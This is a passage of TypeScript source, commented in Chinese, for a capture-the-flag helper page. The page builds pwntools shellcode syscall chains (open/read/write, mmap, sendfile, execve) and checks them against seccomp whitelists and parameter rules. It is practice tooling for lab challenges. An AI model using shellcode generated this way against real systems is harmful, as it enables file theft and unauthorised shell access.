  var DEF: Record<string, string[]> = {write:["1","'rax'","0x100"],read:["0","'rsp'","0x100"],mmap:["0","0x1000","1","2","'rax'","0"],mmap2:["0","0x1000","1","2","'rax'","0"],mprotect:["'rax'","0x1000","7"],sendfile:["1","'rax'","0","0x100"],close:["'rax'"],exit:["0"],open:["'rsp'","0","0"],openat:["-100","'rsp'","0","0"],execve:["'rsp'","0","0"],chmod:["'rsp'","0o777"],fchmod:["'rax'","0o777"],chown:["'rsp'","0","0"],mkdir:["'rsp'","0o755"],creat:["'rsp'","0o644"],rename:["'rsp'","'r13'"],link:["'rsp'","'r13'"],symlink:["'rsp'","'r13'"],unlink:["'rsp'"],rmdir:["'rsp'"],chdir:["'rsp'"],access:["'rsp'","0"],stat:["'rsp'","'r13'"],lstat:["'rsp'","'r13'"],readlink:["'rsp'","'r13'","0x100"],truncate:["'rsp'","0"],lseek:["'rax'","0","0"],dup2:["'rax'","1"],readv:["0","'rsp'","1"],writev:["1","'rsp'","1"],preadv:["'rax'","'rsp'","1","0","0"],pwritev:["1","'rsp'","1","0","0"]};
  var d=DEF[sys.name];
  if(arch==="i386" && sys.name==="mmap") d=["'esp'"];
  if(d) document.querySelectorAll<HTMLInputElement>(".arg-input").forEach(function(inp,i){if(d[i]!==undefined)inp.value=dispVal(d[i]);});
  // 长尾路径调用兜底：STRARG/STR2 收录的字符串参数默认填 rsp / 保存寄存器，保证 buildFullCode 真的带上 pushstr（statx/utimensat/linkat/mount/xattr 等冷门调用也一样）
  (function(){
    var inputs=document.querySelectorAll<HTMLInputElement>(".arg-input");
    var sidx=STRARG[sys.name];
    if(sidx!==undefined && inputs[sidx] && !inputs[sidx].value) inputs[sidx].value=dispVal("'rsp'");
    var two2=STR2[sys.name];
    if(two2){
      if(inputs[two2.a] && !inputs[two2.a].value) inputs[two2.a].value=dispVal("'rsp'");
      // 保存寄存器按架构/调用挑：DEF 里 rename/link/symlink 预填的是 amd64 的 r13，i386 下要换成挑好的空闲寄存器（如 ebp）
      var wantB=dispVal("'"+str2Canon(sys)+"'");
      if(inputs[two2.b] && (!inputs[two2.b].value || inputs[two2.b].value===dispVal("'r13'"))) inputs[two2.b].value=wantB;
    }
    var multi2=STR_MULTI[sys.name];
    if(multi2){
      var rr=strMultiRegs(sys);
      // 每个字符串参数框默认填保存寄存器（第 3 个可选字符串的默认值是空串时也照填：字符串框空着、参数还是自动值时生成传 0，手动改过的寄存器保留，
      // 不影响；用户一旦在字符串框里填了内容，参数框已经是保存寄存器，pushstr 不会丢。之前按默认值跳过，
      // 导致 request_key 的 _callout_info 这类可选字符串填了内容却丢 pushstr。）
      multi2.idx.forEach(function(ix,k){ if(inputs[ix] && !inputs[ix].value && rr[k]) inputs[ix].value=dispVal(rr[k]); });
    }
    // sigsetsize/sizemask 写死默认 8、clone3/openat2 的结构体 size 写死默认、eventfd/eventfd2 的 initval 默认 0（都不是长度，别让用户自己猜）
    sys.args.forEach(function(a,j){ var an2=argName(a); if(!inputs[j] || inputs[j].value) return; if(an2==="sigsetsize"||an2==="sizemask") inputs[j].value="8"; else if(an2==="size" && sys.name==="clone3") inputs[j].value="88"; else if(an2==="size" && sys.name==="openat2") inputs[j].value="24"; else if(an2==="size" && sys.name==="epoll_create") inputs[j].value="1"; else if(an2==="initval" && (sys.name==="eventfd"||sys.name==="eventfd2")) inputs[j].value="0"; });
  })();
  document.querySelectorAll<HTMLInputElement>(".arg-input").forEach(function(inp){
    inp.addEventListener("input",render);
    inp.addEventListener("focus",function(){lastFocus=inp;});
  });
  box.querySelectorAll<HTMLButtonElement>("[data-lenmode]").forEach(function(b){
    b.addEventListener("click",function(){
      var inp=b.closest(".arg-row")?.querySelector<HTMLInputElement>(".arg-input");
      if (!inp) return;
      inp.value=dispVal(b.dataset.v ?? ""); lastFocus=inp; render();
      toast(b.dataset.lenmode==="same" ? "已填跟上一步一样的长度 "+b.dataset.v : "已填上一步返回值 '"+axReg()+"'");
    });
  });
  box.querySelectorAll<HTMLButtonElement>("[data-autofill]").forEach(function(b){
    b.addEventListener("click",function(){
      var inp=b.closest(".arg-row")?.querySelector<HTMLInputElement>(".arg-input");
      if (!inp) return;
      inp.value=dispVal(b.dataset.autofill ?? ""); lastFocus=inp; render();
      toast("已自动填入 "+fmtVal(inp.value));
    });
  });
  box.querySelectorAll<HTMLButtonElement>(".arg-chips button").forEach(function(b){
    b.addEventListener("click",function(){
      var inp=b.closest(".arg-row")?.querySelector<HTMLInputElement>(".arg-input");
      if (!inp) return;
      inp.value=dispVal((b.dataset.v ?? "").replace(/^'|'$/g,"")); lastFocus=inp; render();
    });
  });
  render();
  if (hadSelection) $("detailCard").scrollIntoView({behavior:"smooth",block:"start"});
}
// ===== seccomp 白名单 =====
var wlSet: Record<number, number> | null = null;
function parseWL(){
  var v=($("wlInput").value||"").trim();
  if(!v){wlSet=null;}
  else{
    var set: Record<number, number> = {};
    v.split(/[\s,，、;{}]+/).filter(Boolean).forEach(function(tok){
      tok=tok.toLowerCase().replace(/^sys_/,"");
      if(/^\d+$/.test(tok)) set[+tok]=1;
      else if(/^0x[0-9a-f]+$/.test(tok)) set[parseInt(tok,16)]=1;
      else { var s=SYS.find(function(x){return x.name===tok;}); if(s) set[s.nr]=1; }
    });
    wlSet=set;
  }
  var st=$("wlStatus");
  if(!wlSet){ st.innerHTML="未设置白名单，不做检查。生成对了不等于能跑：seccomp 只放行名单内的调用号，用了名单外的，进程会被 SIGSYS 杀掉或返回 -EPERM。"; }
  else{
    var names=Object.keys(wlSet).map(function(n){var s=SYS.find(function(x){return x.nr===+n;});return s? s.name+"("+n+")" : "NR "+n;});
    st.innerHTML="当前白名单（"+arch+"）：<b>"+names.join("、")+"</b>。生成区和链里不在名单内的调用会被标红。";
  }
  render(); renderChain();
}
function wlBlocked(nr: number | null){ return nr !== null && wlSet !== null && !wlSet[nr]; }
// ===== seccomp 参数限制 =====
function paramRules(){
  return {
    writeFd: ($("wlWriteFd") ? $("wlWriteFd").value.trim() : ""),
    openName: ($("wlOpenName") ? $("wlOpenName").value.trim() : ""),
    readFd: ($("wlReadFd") ? $("wlReadFd").value.trim() : ""),
    execBan: ($("wlExecBan") ? $("wlExecBan").value.trim() : "")
  };
}
function hasParamRules(){ var r=paramRules(); return !!(r.writeFd||r.openName||r.readFd||r.execBan); }
function normVal(v: string){ return (v||"").trim().replace(/^'|'$/g,""); }
function paramViolation(name: string, vals: string[], strVal?: string){
  var r=paramRules(); if(!hasParamRules()) return null;
  vals=vals||[];
  // fd 是数字时按数值比（0x1 就是 1，别因写法不同误报）；值是寄存器时静态页面不知道它运行时的值，只能提醒核对，不能断言“会被 seccomp 拦”。
  function fdMismatch(v: string, allowed: string){
    var uv=parseNum(v), av=parseNum(allowed);
    if(uv!==null && av!==null) return uv!==av;
    return normVal(v)!==normVal(allowed);
  }
  function fdNote(v: string, allowed: string, sysName: string){
    if(REGNAMES.indexOf(normVal(v))>=0)
      return sysName+" 的 fd="+ (v||"?") +"，题目只放行 fd="+allowed+"。静态检查无法确认该寄存器运行时的值，请核对它存的是否就是允许的 fd。";
    return sysName+" 的 fd="+ (v||"?") +"，题目只放行 fd="+allowed+"，这步参数会被 seccomp 拦。";
  }
  if(name==="write" && r.writeFd && fdMismatch(vals[0], r.writeFd))
    return fdNote(vals[0], r.writeFd, "write");
  if(name==="read" && r.readFd && fdMismatch(vals[0], r.readFd))
    return fdNote(vals[0], r.readFd, "read");
  if((name==="open"||name==="openat") && r.openName){
    var fn = strVal!==undefined && strVal!==null ? strVal : (($("strInput")&&$("strInput").value)||"");
    if(fn && fn.indexOf(r.openName)<0) return "要打开的文件名是 '"+fn+"'，题目只放行包含 '"+r.openName+"' 的路径，这步参数会被 seccomp 拦。改文件名或改参数限制再核对题目。";
  }
  if((name==="execve"||name==="execveat") && r.execBan){
    var fn2 = strVal!==undefined && strVal!==null ? strVal : (($("strInput")&&$("strInput").value)||"");
    if(fn2 && fn2.indexOf(r.execBan)>=0) return "execve 的路径 '"+fn2+"' 包含被禁止的 '"+r.execBan+"'，这步参数会被 seccomp 拦。";
  }
  return null;
}
function parseParamRules(){
  var st=$("paramStatus"); if(!st) return;
  if(!hasParamRules()) st.textContent="未设置参数限制。有些题用 seccomp 做参数过滤（如只放行 write fd=1、open 只能开 flag）：调用号在白名单里、参数超了照样会被拦。填了上面任一项，生成区和链里都会标黄提醒。";
  else { var r=paramRules(), parts=[]; if(r.writeFd)parts.push("write fd 只允许 "+r.writeFd); if(r.readFd)parts.push("read fd 只允许 "+r.readFd); if(r.openName)parts.push("open/openat 文件名须包含 '"+r.openName+"'"); if(r.execBan)parts.push("execve 路径禁止包含 '"+r.execBan+"'"); st.innerHTML="当前参数限制：<b>"+parts.join("；")+"</b>。超限的步会在生成区和链里标黄。"; }
  render(); renderChain();
}

// mmap/mmap2 的 flags/fd 配对交叉校验（只提醒，不改生成）：匿名映射不需要 fd，文件映射 fd=-1 会 EBADF。
function mmapPairWarning(){
  if(!cur || (cur.name!=="mmap" && cur.name!=="mmap2")) return null;
  var vals=currentVals(), fi=-1, di=-1;
  cur.args.forEach(function(a,j){ var an=argName(a); if(an==="flags") fi=j; if(an==="fd") di=j; });
  if(fi<0||di<0) return null;
  var fl=parseNum(vals[fi]); if(fl===null) return null;
  var fd=(vals[di]||"").trim().replace(/^'|'$/g,"");
  if((fl & 0x20) && REGNAMES.indexOf(fd)>=0)
    return "mmap：flags 含 MAP_ANONYMOUS(0x20)，这是匿名映射，不需要 fd——fd 填 -1 就行，现在填的是寄存器 '"+fd+"'，会被内核忽略。";
  if(!(fl & 0x20) && parseNum(vals[di])===-1)
    return "mmap：flags 不含 MAP_ANONYMOUS(0x20)，这是文件映射，fd=-1 会 EBADF——填 open 返回的 fd（'"+axReg()+"' 或已保存的寄存器）。";
  return null;
}
function render(){
  if(!cur)return;
  $("genCode").textContent=buildFullCode(cur,currentVals());
  var bad=wlBlocked(cur.nr), gb=$("genCode"), ww=$("wlWarn");
  var pv=paramViolation(cur.name, currentVals());
  var mw=mmapPairWarning();
  gb.classList.toggle("blocked-code", !!bad);
  if(bad){
    ww.innerHTML="⛔ <b>seccomp 会拦：</b>SYS_"+cur.name+"（NR "+cur.nr+"）不在你填的白名单里，运行时进程会被 SIGSYS 杀掉或返回 -EPERM。换白名单内的调用，或把这个号加进白名单再核对题目。"+(pv?"<br>⚠ <b>参数也会被拦：</b>"+pv:"")+(mw?"<br>⚠ <b>映射配对：</b>"+mw:"");
    ww.classList.add("show");
  } else if(pv){
    ww.innerHTML="⚠ <b>参数会被拦：</b>"+pv+(mw?"<br>⚠ <b>映射配对：</b>"+mw:"");
    ww.classList.add("show");
  } else if(mw){
    ww.innerHTML="⚠ <b>映射配对：</b>"+mw;
    ww.classList.add("show");
  } else ww.classList.remove("show");
  if($("asmPreview").style.display!=="none") updateAsmPreview();
}
// 汇编预览必须和生成的代码用同一套参数：buildFullCode 会把「字符串框留空」的参数改传 0、
// 把「框填了但参数还是空/0」的参数补成 'rsp'/保存寄存器。预览若直接用参数框的原始值，
// 就会残留代码里根本没有的 mov（如 rename 第二个框留空：代码第二参数传 0，预览却还写 mov rsi, r13）。
// 这里按 buildFullCode 相同的规则算实际生效的参数，只给预览和顺序说明用，不改生成逻辑。
function effectiveVals(sys: Syscall, vals: string[]){
  var out=vals.slice();
  var multi=STR_MULTI[sys.name];
  if(multi){
    var strs=[($("strInput").value||"").trim(),($("strInput2").value||"").trim(),($("strInput3")?($("strInput3").value||"").trim():"")];
    for(var k=0;k<multi.idx.length;k++){
      var canon=multiCanon(sys,k);
      if(!strs[k]){ // 与 buildFullCode 同口径：只有自动值（空 / 0 / 保存寄存器）才算 0，用户手动改的寄存器保留，预览不能把它显示成 0
        var rawV2=vals[multi.idx[k]];
        if(rawV2==="" || fmtVal(rawV2)==="0" || (canon && fmtVal(rawV2)==="'"+physOf(canon)+"'")) out[multi.idx[k]]="0";
      }
      else if(canon && (fmtVal(vals[multi.idx[k]])==="'"+physOf(canon)+"'" || vals[multi.idx[k]]==="" || fmtVal(vals[multi.idx[k]])==="0")) out[multi.idx[k]]="'"+physOf(canon)+"'";
    }
    // i386 mount 走手动 mov 顺序时例外：手动路径里 dev/dir/type 的最终值只由 use 决定（mountManual32 不读这三个参数框），
    // 预览/顺序说明要跟生成代码一致。按 buildFullCode 的同一套规则重算 use、同一条件判定是否走手动路径：
    // 走了手动路径时，框留空的参数就是传 0——哪怕参数框被手动改成了别的寄存器，生成代码也传 0，说明不能还按那个寄存器写；
    // 框填了且参数自动时 dev=esp、dir=ebp；type 的暂存 dir 存了用 edi、dir 没存直接用 ebp（见 mountManual32 的 temp2）。
    // 没走手动路径时不动（dir 填了但参数被改成别的寄存器等情况仍走普通生成，F3 口径保留手动值）。
    if(arch==="i386" && sys.name==="mount"){
      var useM: boolean[]=[];
      for(var k2=0;k2<multi.idx.length;k2++){
        var cn2=multiCanon(sys,k2);
        useM[k2]=!!strs[k2] && !!cn2 && (fmtVal(vals[multi.idx[k2]])==="'"+physOf(cn2)+"'" || vals[multi.idx[k2]]==="" || fmtVal(vals[multi.idx[k2]])==="0");
      }
      if(useM[2] && (!strs[1] || useM[1]) && (useM[0] || !strs[0])){
        out[multi.idx[0]]= useM[0] ? "'"+spReg()+"'" : "0";
        out[multi.idx[1]]= useM[1] ? "'ebp'" : "0";
        out[multi.idx[2]]= useM[1] ? "'edi'" : "'ebp'";
      }
    }
    return out;
  }
  var two=STR2[sys.name];
  if(two){
    var s1=($("strInput").value||"").trim(), s2=($("strInput2").value||"").trim();
    var savePhys=physOf(str2Canon(sys));
    if(s1 && (fmtVal(vals[two.a])==="'"+spReg()+"'" || vals[two.a]==="" || fmtVal(vals[two.a])==="0")) out[two.a]="'"+spReg()+"'";
    if(s2 && (fmtVal(vals[two.b])==="'"+savePhys+"'" || vals[two.b]==="" || fmtVal(vals[two.b])==="0")) out[two.b]="'"+savePhys+"'";
    if(!s1 && fmtVal(vals[two.a])==="'"+spReg()+"'") out[two.a]="0";
    if(!s2 && fmtVal(vals[two.b])==="'"+savePhys+"'") out[two.b]="0";
    return out;
  }
  var idx=STRARG[sys.name];
  if(idx!==undefined){
    var sv=($("strInput").value||"").trim();
    if(!sv){ if(fmtVal(vals[idx])==="'"+spReg()+"'") out[idx]="0"; }
    else if(fmtVal(vals[idx])==="'"+spReg()+"'" || vals[idx]==="" || fmtVal(vals[idx])==="0") out[idx]="'"+spReg()+"'";
  }
  return out;
}
function asmPreviewText(sys: Syscall, vals: string[]){
  var lines: string[]=[];
  var full=buildFullCode(sys, vals);
  if(!/(^|\n)sc \+= shellcraft\.(amd64|i386)\.linux\.syscall\(/.test(full)){ // 手动 mov 顺序生成（i386 mount，没有空闲保存寄存器时的兜底）：原样展示，不套 syscall 的寄存器说明。按生成语句本身判断，不用 "syscall(" 子串——字符串内容（如文件名）里出现 syscall( 会让子串判断把手动代码误判成普通路径
    var ml=full.split("\n").map(function(l){return "; "+l.replace("sc += ","");});
    ml.push("");
    var dirEmpty=!($("strInput2").value||"").trim();
    ml.push(dirEmpty
      ? "; 这条不走 shellcraft.syscall：寄存器搬运顺序写死在上面——dir 留空传 0，type 直接存 ebp、再搬进 edx，edi 留给 data。"
      : "; 这条不走 shellcraft.syscall：寄存器搬运顺序写死在上面——type 先暂存 edi，搬进 edx 之后 edi 才轮到放 data；dir 存 ebp（mount 用不到）。");
    return ml.join("\n");
  }
  if(full.indexOf("pushstr")>=0){
    full.split("\n").forEach(function(l){
      if(l.indexOf("pushstr")>=0) lines.push("; "+l.replace("sc += ","")+"  → 字符串压栈，"+spReg()+" 指向它");
      if(l.indexOf("'mov ")>=0||l.indexOf('"mov ')>=0) lines.push("; "+l.replace("sc += ",""));
    });
  }
  var movCount=0, skipped=0;
  effectiveVals(sys, vals).forEach(function(v,i){
    var av=asmVal(v);
    if(av===REGS[i]){ skipped++; lines.push("; "+REGS[i]+" 已是 "+av+"（setregs 会跳过这一步，不用再 mov）"); }
    else { movCount++; lines.push("mov "+REGS[i]+", "+av); }
  });
  lines.push("mov "+axReg()+", "+sys.nr+(arch==="i386"?"":"  ; SYS_"+sys.name));
  lines.push(arch==="i386" ? "int 0x80" : "syscall");
  lines.push("");
  lines.push("; 共 "+(movCount+2)+" 条核心指令（不含 pushstr 展开）"+(skipped?"，其中 "+skipped+" 条 setregs 已跳过（参数值恰好等于目标寄存器）":"")+"。字节长度随立即数/寄存器编码变化，");
  lines.push("; 本页不能运行 pwntools：真实长度和 asm() 是否报错，在 VM 里跑 print(len(asm(sc))) 确认。");
  return lines.join("\n");
}
function updateAsmPreview(){ if(cur) $("asmPreview").textContent=asmPreviewText(cur, currentVals()); }
function selectByName(n: string){var s=SYS.find(function(x){return x.name===n;});if(s)select(s);}

function findExactSys(v: string){
  v=(v||"").trim().toLowerCase();
  return SYS.find(function(x){return x.name===v || String(x.nr)===v || ("0x"+x.nr.toString(16))===v;});
}
function doSearch(){
  var v=q.value.trim().toLowerCase(); if(!v){suggest.classList.remove("open");return;}
  var hits=SYS.filter(function(s){return s.name.indexOf(v)>=0||String(s.nr)===v||("0x"+s.nr.toString(16))===v;}).slice(0,8);
  if(!hits.length){suggest.innerHTML='<button disabled>没找到，换英文名或数字试试</button>';suggest.classList.add("open");return;}
  suggest.innerHTML=hits.map(function(s){return '<button data-nr="'+s.nr+'"><span class="mono"><b>'+s.name+"</b> <span style='color:var(--muted)'>"+s.args.map(argName).join(", ")+'</span></span><span class="nr">NR '+s.nr+" · 0x"+s.nr.toString(16)+"</span></button>";}).join("");
  suggest.classList.add("open");
  suggest.querySelectorAll<HTMLButtonElement>("button[data-nr]").forEach(function(b){b.addEventListener("click",function(){var s=SYS.find(function(x){return x.nr===Number(b.dataset.nr);});if(s)select(s);});});
}
q.addEventListener("input",doSearch);
q.addEventListener("focus",doSearch);
q.addEventListener("keydown",function(e){
  if(e.key==="Enter"){var v=q.value.trim().toLowerCase();var s=findExactSys(v);if(s)select(s);else doSearch();}
});
document.addEventListener("click",function(e){if(!(e.target as Element | null)?.closest(".search-wrap"))suggest.classList.remove("open");});

function toast(msg: string){var t=$("toast");t.textContent=msg;t.classList.add("show");setTimeout(function(){t.classList.remove("show");},1600);}
function copyText(txt: string, msg: string){
  function done(){toast(msg||"已复制");}
  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(txt).then(done).catch(function(){fallback();});}else fallback();
  function fallback(){var ta=document.createElement("textarea");ta.value=txt;document.body.appendChild(ta);ta.select();try{document.execCommand("copy");}catch(e){}document.body.removeChild(ta);done();}
}
$("copyBtn").addEventListener("click",function(){if(cur)copyText(buildFullCode(cur,currentVals()),"已复制这行 syscall");});
$("strInput").addEventListener("input",render);
$("strInput2").addEventListener("input",render);
$("strInput3").addEventListener("input",render);
$("asmBtn").addEventListener("click",function(){
  var n=$("asmNote"), p=$("asmPreview"); if(!cur)return;
  var lines=effectiveVals(cur, currentVals()).map(function(v,i){return REGS[i]+" ← "+(asmVal(v));});
  n.innerHTML="pwntools 生成汇编的顺序：先把参数搬进寄存器（"+(lines.join("，")||"无参数")+"），<b>最后</b>才把 "+axReg()+" 改成调用号 "+cur.nr+"，所以参数里用 '"+axReg()+"' 不会被覆盖。执行完之后："+raxAfter(cur.name);
  var show=n.style.display==="none";
  n.style.display=show?"block":"none";
  p.style.display=show?"block":"none";
  if(show) updateAsmPreview();
});

// 链
var FD_PRODUCERS: Record<string, number> ={open:1,openat:1,openat2:1,socket:1,accept:1,accept4:1,dup:1,dup2:1,dup3:1,eventfd:1,eventfd2:1,timerfd_create:1,inotify_init:1,epoll_create:1,epoll_create1:1,memfd_create:1,open_tree:1,fsopen:1,fspick:1,pidfd_open:1,signalfd:1,signalfd4:1,userfaultfd:1,landlock_create_ruleset:1,inotify_init1:1,pidfd_getfd:1,io_uring_setup:1,fanotify_init:1,open_by_handle_at:1,perf_event_open:1};
var ADDR_PRODUCERS: Record<string, number> ={mmap:1,mmap2:1,brk:1,mremap:1,shmat:1};
function isSaveStep(s: ChainStep | undefined){ return s && s.isSave; }
// 插入保存步时挑寄存器：先看链里已有的保存步占了哪些，再避开后续步骤参数里实际用到的寄存器，
// 以及后续步骤生成代码里出现过的候选寄存器（清空参数框时 buildFullCode 会自动生成 mov r13, rsp 之类的代码，
// 只扫参数值看不到，挑中它保存的值会被那句代码盖掉）。
// amd64 从 r12、r13、r14、r15 里挑第一个未用的，i386 从 esi/edi/ebp 里挑。都占满时回退到第一个候选。
// 扫生成代码时先抹掉 pushstr('…') 里的字符串内容：那是文件名之类的数据，文件名正好叫 r13 不算占用这个寄存器，
// 不抹掉会误判（把还能用的保存寄存器白白跳过）。
function pickSaveReg(afterIdx: number){
  var cands=arch==="i386" ? ["esi","edi","ebp"] : ["r12","r13","r14","r15"];
  var used: Record<string, number> = {};
  chain.forEach(function(s){
    if(isSaveStep(s)){ var m=/mov\s+([a-z0-9]+),/.exec(s.code||""); if(m) used[m[1]]=1; }
  });
  for(var k=afterIdx+1;k<chain.length;k++){
    var s=chain[k]; if(!s) continue;
    if(s.code){ var codeStr=String(s.code).replace(/pushstr\('(?:\\.|[^'\\])*'\)/g,"pushstr('')"); cands.forEach(function(c){ if(new RegExp("\\b"+c+"\\b").test(codeStr)) used[c]=1; }); }
    if(isSaveStep(s)||!s.vals) continue;
    s.vals.forEach(function(v){ var r=(v||"").trim().replace(/^'|'$/g,""); if(r) used[r]=1; });
  }
  for(var j=0;j<cands.length;j++){ if(!used[cands[j]]) return cands[j]; }
  return cands[0];
}
function saveWarningFor(i: number){
  var s=chain[i]; if(!s||isSaveStep(s)) return null;
  var kind = FD_PRODUCERS[s.name] ? "fd" : (ADDR_PRODUCERS[s.name] ? (s.name==="brk" ? "堆顶地址" : "映射地址") : null);
  if(!kind) return null;
  if(i>=chain.length-1) return null;
  if(isSaveStep(chain[i+1])) return null;
  return kind;
}
function renderChain(){
  var box=$("chainBox");
  if(!chain.length){box.innerHTML='<p class="empty">链还是空的。在上面填好一个调用，点「＋ 加到链里」。</p>';$("chainOut").style.display="none";return;}
  box.innerHTML=chain.map(function(s,i){
    if(isSaveStep(s)){
      return '<div class="chain-step save-step"><div class="cs-head"><span class="cs-title">第 '+(i+1)+' 步 \u00b7 保存返回值（不算系统调用）</span><button data-del="'+i+'" aria-label="删除">✕</button></div><div class="cs-code">'+s.code.replace(/\n/g," ")+'</div><div class="cs-rax">执行完 \u2192 '+s.rax+'</div></div>';
    }
    var bad=wlBlocked(s.nr);
    var pv=paramViolation(s.name, s.vals||[], s.strVal);
    var sw=saveWarningFor(i);
    var saveReg=sw ? pickSaveReg(i) : null;
    var saveHtml = sw ? '<div class="cs-save">⚠ 这步的'+sw+'只存在 '+axReg()+' 里，下一步一执行就会被覆盖丢掉。如果后面还要用这个'+sw+'，先保存：<button data-save="'+i+'">插入 mov '+ saveReg +', '+axReg() +' 保存</button><br>插入后，后面要用这个'+sw+'的步把参数从 \''+axReg()+'\' 改成 \''+saveReg+'\'，别再填 '+axReg()+'。</div>' : "";
    return '<div class="chain-step'+(bad?" blocked":"")+(pv?" param-blocked":"")+'"><div class="cs-head"><span class="cs-title">第 '+(i+1)+" 步 · "+s.name+" ("+s.nr+')</span><button data-del="'+i+'" aria-label="删除">✕</button></div><div class="cs-code">'+s.code.replace(/\n/g," ")+'</div><div class="cs-rax">执行完 → '+s.rax+(bad?' &nbsp;<span class="wl-bad">⛔ 不在白名单里，seccomp 会拦这步</span>':"")+(pv?' &nbsp;<span class="wl-bad" style="color:#d97706">⚠ 参数超限：'+pv+"</span>":"")+"</div>"+saveHtml+"</div>";
  }).join("");
  box.querySelectorAll<HTMLButtonElement>("button[data-del]").forEach(function(b){b.addEventListener("click",function(){chain.splice(Number(b.dataset.del),1);renderChain();});});
  box.querySelectorAll<HTMLButtonElement>("button[data-save]").forEach(function(b){b.addEventListener("click",function(){
    var i=Number(b.dataset.save);
    var reg = pickSaveReg(i);
    chain.splice(i+1,0,{isSave:true,name:"__save",nr:null,code:"sc += 'mov "+reg+", "+axReg()+"\\n'  # 保存上一步的返回值，后面要用它时填 '"+reg+"' 不要填 '"+axReg()+"'",rax:axReg()+" 不变，"+reg+" = 刚才保存的值",vals:[],strVal:""});
    renderChain(); toast("已插入保存步，后面要用时改填 '"+reg+"'");
  });});
  var full="from pwn import *\ncontext.arch = '"+arch+"'\n\nsc = ''\n"+chain.map(function(s){return s.code;}).join("\n")+"\nshellcode = asm(sc)";
  $("chainCode").textContent=full;
  $("chainOut").style.display="block";
}
$("addChainBtn").addEventListener("click",function(){
  if(!cur)return;
  var _vals=currentVals();
  const current = cur;
  current.args.forEach(function(a,j){ if(isLenName(argName(a), current.name) && parseNum(_vals[j])!==null) lastLenValue=_vals[j]; });
  chain.push({name:cur.name,nr:cur.nr,code:buildFullCode(cur,currentVals()),rax:raxAfter(cur.name),vals:_vals,strVal:($("strInput").value||"")});
  renderChain(); toast("已加到链里：第 "+chain.length+" 步 "+cur.name);
});
$("clearChain").addEventListener("click",function(){chain=[];renderChain();});
$("copyChainBtn").addEventListener("click",function(){copyText($("chainCode").textContent,"已复制整段 shellcode");});
function preset(list: [string, string[]][]){
  chain=list.map(function(item){
    var s=requireSys(item[0]);
    return {name:s.name,nr:s.nr,code:buildCode(s,item[1]),rax:raxAfter(s.name)};
  });
  renderChain();
}
function openStepCode(){
  return "sc += shellcraft.pushstr('flag')\nsc += "+archPath()+".syscall(\n    'SYS_open', '"+spReg()+"', 0, 0\n)";
}
function openatStepCode(){
  return "sc += shellcraft.pushstr('flag')\nsc += "+archPath()+".syscall(\n    'SYS_openat', -100, '"+spReg()+"', 0, 0\n)";
}
function findSys(n: string){ return SYS.find(function(x){return x.name===n;}); }
function requireSys(name: string): Syscall {
  const syscall = findSys(name);
  if (!syscall) throw new Error("Syscall unavailable for " + arch + ": " + name);
  return syscall;
}
$("presetMmap").addEventListener("click",function(){
  var mmName = arch==="i386" ? "mmap2" : "mmap";
  var mm = requireSys(mmName), op = requireSys("open"), wr = requireSys("write");
  chain=[
    {name:"open",displayName:"open (pushstr+封装)",nr:op.nr,code:openStepCode(),rax:archText("rax = flag 的 fd（通常 = 3）"),vals:["'rsp'","0","0"],strVal:"flag"},
    {name:mmName,nr:mm.nr,code:buildCode(mm,["0","0x100","1","2","'rax'","0"]),rax:raxAfter(mmName),vals:["0","0x100","1","2","'rax'","0"],strVal:""},
    {name:"write",nr:wr.nr,code:buildCode(wr,["1","'rax'","0x100"]),rax:raxAfter("write"),vals:["1","'rax'","0x100"],strVal:""}
  ];
  renderChain(); toast("已拼好 open → "+mmName+" → write");
});
$("presetOrw").addEventListener("click",function(){
  var op = requireSys("open"), rd = requireSys("read"), wr = requireSys("write");
  chain=[
    {name:"open",displayName:"open (pushstr+封装)",nr:op.nr,code:openStepCode(),rax:archText("rax = flag 的 fd（通常 = 3）"),vals:["'rsp'","0","0"],strVal:"flag"},
    {name:"read",nr:rd.nr,code:buildCode(rd,["'rax'","'rsp'","0x100"]),rax:raxAfter("read")+archText("；注意 fd 用完这步后，下一步 write 的 buf 就在 rsp"),vals:["'rax'","'rsp'","0x100"],strVal:""},
    {name:"write",nr:wr.nr,code:buildCode(wr,["1","'rsp'","0x100"]),rax:raxAfter("write"),vals:["1","'rsp'","0x100"],strVal:""}
  ];
  renderChain(); toast("已拼好 open → read → write");
});

// ===== 按白名单直接生成工具链 =====
function wlHas(name: string){ var s=findSys(name); return !!(s && wlSet && wlSet[s.nr]); }
function openerStep(){
  if(wlHas("open")){ var op=requireSys("open"); return {name:"open",nr:op.nr,code:openStepCode(),rax:archText("rax = flag 的 fd（通常 = 3）"),vals:["'rsp'","0","0"],strVal:"flag"}; }
  var oa=requireSys("openat"); return {name:"openat",nr:oa.nr,code:openatStepCode(),rax:archText("rax = flag 的 fd（通常 = 3）"),vals:["-100","'rsp'","0","0"],strVal:"flag"};
}
function wlGenChain(){
  var res=$("wlGenResult");
  function show(html: string){ res.innerHTML=html; res.classList.add("show"); }
  if(!wlSet){ show("先在上面填白名单（这道题放行的调用名或调用号，如 "+wlPresetNames("mmap").join(",")+"），再点生成。没填白名单时不知道哪些调用能用，拼不出链。"); return; }
  var mmName = arch==="i386" ? "mmap2" : "mmap";
  var openerName = wlHas("open") ? "open" : (wlHas("openat") ? "openat" : null);
  function nrOf(n: string){ var s=findSys(n); return s? s.nr : "?"; }
  // 候选链（按优先级）：needs 里 "§open" 表示 open/openat 任一
  var cands: {label: string; needs: string[]; missing: string[]}[]=[
    {label:"§open → "+mmName+" → write（映射文件再输出）", needs:["§open",mmName,"write"], missing: []},
    {label:"§open → read → write（经典 ORW）", needs:["§open","read","write"], missing: []},
    {label:"§open → sendfile（内核直接转发，不用 read/write 缓冲）", needs:["§open","sendfile"], missing: []},
    {label:"execve（拿 shell，不读 flag 文件）", needs:["execve"], missing: []}
  ];
  cands.forEach(function(c){
    c.missing=[];
    c.needs.forEach(function(n){
      if(n==="§open"){ if(!openerName) c.missing.push("open（NR "+nrOf("open")+"）或 openat（NR "+nrOf("openat")+"）——没有打开文件的调用，第一步就做不了"); }
      else if(!wlHas(n)) c.missing.push(n+"（NR "+nrOf(n)+"）");
    });
  });
  var ok=cands.find(function(c){return !c.missing.length;});
  if(!ok){
    var lines=cands.map(function(c){return "「"+c.label.replace("§open","open/openat")+"」缺："+c.missing.join("、");});
    show("<b>拼不出来：白名单里凑不齐任何一条完整链。</b><br>"+lines.join("<br>")+"<br>把缺的调用加进白名单（先对着题目确认它确实放行），或换一道白名单更全的题练。只标红不生成，就是因为缺一步整条链都跑不通。");
    toast("白名单拼不出完整链");
    return;
  }
  var label=ok.label.replace("§open",openerName ?? "open/openat");
